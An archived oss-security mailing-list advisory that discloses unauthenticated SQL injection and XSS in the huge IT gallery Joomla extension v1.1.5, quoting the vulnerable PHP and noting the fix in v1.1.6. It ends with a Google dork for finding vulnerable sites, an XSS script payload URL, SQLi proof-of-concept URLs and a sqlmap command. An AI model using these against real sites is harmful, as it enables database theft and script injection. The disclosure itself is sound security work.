X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2933" "Thursday" "1" "September" "2016" "08:22:11" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<4C085536-DC31-4B21-B1DE-2DA8F1414995@me.com>" "73" "[oss-security] Updated: XSS and SQLi in huge IT gallery v1.1.5 for Joomla" nil nil nil "9" "2016090112:22:11" "[oss-security] Updated: XSS and SQLi in huge IT gallery v1.1.5 for Joomla" (number mark "U       larry0@me.co Sep  1   73/2933  " thread-indent "\"[oss-security] Updated: XSS and SQLi in huge IT gallery v1.1.5 for Joomla\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3702 invoked by uid 550); 1 Sep 2016 12:22:35 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3658 invoked from network); 1 Sep 2016 12:22:32 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1472732535; bh=t01hJXLQJjYPMjcXhoOTVzjuakKYtYnXdsF4tWKVGRs=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=PzXx3zFwf18zwteR92Q6OLLfpJInkyyTYSHirSiv1k/30Se7dhKrDJo/luZHx8h0c
 Ls7PF7HwNXZq0tKQMtvw1Bran698p1EqrD+NzKUNysAhoxvG2BZiGgWcxNX6qluJlf
 8w5gR1WD8p3qDuFmh5tss1hX6WgTcVdLpiy2dPN31QE+dOV8jnka/6AJb/NV/J5Xtj
 VIgXOkDGY/ScPsWdCRcrY6Q91XvEl9uUts6DhOLj9XWsEfvq9jBHtwMn96y2CGHUgF
 ztfhd7nzUGZbQaeiZqQi7BlufqzPL/YZGy8i2CBY/wDTJGFf0SJvQg8XZdk11iyE7Q
 HWAKLaOAc3LJw==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2016-09-01_05:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1603290000 definitions=main-1609010135
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=us-ascii
Content-transfer-encoding: quoted-printable
Message-id: <4C085536-DC31-4B21-B1DE-2DA8F1414995@me.com>
Date: Thu, 01 Sep 2016 08:22:11 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Subject: [oss-security] Updated: XSS and SQLi in huge IT gallery v1.1.5 for Joomla

I thought I should share this here, this vulnerability doesn't require auth=
entication to exploit it has been fixed in v1.1.6 not v1.1.7.


Title: XSS and SQLi in huge IT gallery v1.1.5 for Joomla
Author: Larry W. Cashdollar, @_larry0 Elitza Neytcheva, @E1337za=20
Date: 2016-07-14
Download Site: http://extensions.joomla.org/extensions/extension/photos-a-i=
mages/galleries/gallery-pro
Vendor: huge-it.com
Vendor Notified: 2016-07-15, fixed v1.1.6
Vendor Contact: info@huge-it.com
Advisory: http://www.vapidlabs.com/advisory.php?v=3D164
Description: The plugin allows you to add multiple images to the gallery, c=
reate countless galleries, add a description to each of them, as well as ma=
ke the same things with video links.
Vulnerability:
The attacker does not need to be logged in to Joomla to exploit this vulner=
ability:

SQL in code via id parameter:
./administrator/components/com_gallery/models/gallery.php
51     public function getPropertie() {
52         $db =3D JFactory::getDBO();
53         $id_cat =3D JRequest::getVar('id');
54         $query =3D $db->getQuery(true);
55         $query->select('#__huge_itgallery_images.name as name,'
56                 . '#__huge_itgallery_images.id ,'
57                 . '#__huge_itgallery_gallerys.name as portName,'
58                 . 'gallery_id, #__huge_itgallery_images.description as d=
escription,image_url,sl_url,sl_type,link_target,#__huge_itg    allery_image=
s.ordering,#__huge_itgallery_images.published,published_in_sl_width');
59         $query->from(array('#__huge_itgallery_gallerys' =3D> '#__huge_it=
gallery_gallerys', '#__huge_itgallery_images' =3D> '#__huge_itg    allery_i=
mages'));
60         $query->where('#__huge_itgallery_gallerys.id =3D gallery_id')->w=
here('gallery_id=3D' . $id_cat);
61         $query->order('ordering desc');
62=20
64         $db->setQuery($query);
65         $results =3D $db->loadObjectList();
66         return $results;
67     }

XSS is here:

root@Joomla:/var/www/html# find . -name "*.php" -exec grep -l "echo \$_GET"=
 {} \;
./administrator/components/com_gallery/views/gallery/tmpl/default.php
root@Joomla:/var/www/html# find . -name "*.php" -exec grep -n "echo \$_GET"=
 {} \;
256:                    <a class=3D"modal" rel=3D"{handler: 'iframe', size:=
 {x: 800, y: 500}}" href=3D"index.php?option=3Dcom_gallery&view=3Dvideo&tmp=
l=3Dcomponent&pid=3D<?php echo $_GET['id']; ?>" title=3D"Image" >

CVE-2016-1000113 SQLi
CVE-2016-1000114 XSS
Google Dork:
inurl:option=3Dcom_gallery inurl:id

Exploit Code:
XSS PoC
http://192.168.0.125/administrator/index.php?option=3Dcom_gallery&view=3Dga=
llery&id=3D1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E
=20
SQLi PoC
http://192.168.0.125/administrator/index.php?option=3Dcom_gallery&view=3Dga=
llery&id=3DSQLiHERE

http://192.168.0.125/index.php?option=3Dcom_gallery&id=3DHERE
=20
$ sqlmap -u "http://192.168.0.125/index.php?option=3Dcom_gallery&id=3D*" --=
dbms mysql=
